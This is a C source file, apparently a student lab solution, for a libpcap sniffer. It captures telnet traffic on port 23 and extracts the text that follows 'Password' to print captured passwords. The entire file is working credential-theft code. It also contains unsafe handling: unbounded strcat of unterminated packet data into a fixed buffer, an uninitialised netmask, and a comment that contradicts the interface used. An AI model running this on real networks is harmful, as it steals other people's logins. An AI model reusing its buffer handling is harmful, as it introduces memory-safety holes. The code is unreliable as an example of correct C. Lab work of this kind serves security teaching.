/*
***********************************************
Task 2.1C - sniffing packets
Eyal Levi, Dan Davidov
***********************************************
*/

#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/tcp.h>

char buffer[1000];
int flag = 0;

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct iphdr *iph = (struct iphdr*)(packet + ETH_HLEN);

        unsigned short iphdrlen = iph->ihl*4;

        struct sockaddr_in source, dest;
        memset(&source, 0, sizeof(source));
        source.sin_addr.s_addr = iph->saddr;
        memset(&dest, 0, sizeof(dest));
        dest.sin_addr.s_addr = iph->daddr;

        printf("-------------------- Packet No.--------------------\n");
        printf("\nIP Header:\n");
        printf("\tSource IP        : %s\n",inet_ntoa(source.sin_addr));
        printf("\tDestination IP   : %s\n",inet_ntoa(dest.sin_addr));
        printf("\nTCP Header:\n");
        struct tcphdr *tcph = (struct tcphdr *)(packet + ETH_HLEN + iphdrlen);
        printf("\tsrc port          : %d\n", ntohs(tcph->source));
        printf("\ndst port          : %d\n", ntohs(tcph->dest));

        int tcpdatalen = tcph->doff * 4;

        const unsigned char *payload = packet + ETH_HLEN + iphdrlen + tcpdatalen;
        if(flag){
            strcat(buffer, payload);
        }
        if(strstr(payload, "\n") != NULL){
            flag = 0;
        }
        if(strstr(payload, "Password") != NULL){
            flag = 1;
        }
        printf("***** The Password is: *****\n");
        printf("%s\n", buffer);

}

int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter_exp = "port 23";
    bpf_u_int32 net;

    // Step 1: Open live pcap session on NIC with name eth3
    handle = pcap_open_live("br-a7b19a894212", BUFSIZ, 1, 1000, errbuf);

    // Step 2: Compile filter_exp into BPF psuedo-code
    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);
    
    // Step 3: Capture packets
    printf("Sniffing packet....\n");
    pcap_loop(handle, -1, got_packet, NULL);
    
    pcap_close(handle); //Close the handle
    return 0;
}
// Note: don’t forget to add "-lpcap" to the compilation command.
// For example: gcc -o sniff sniff.c -lpcap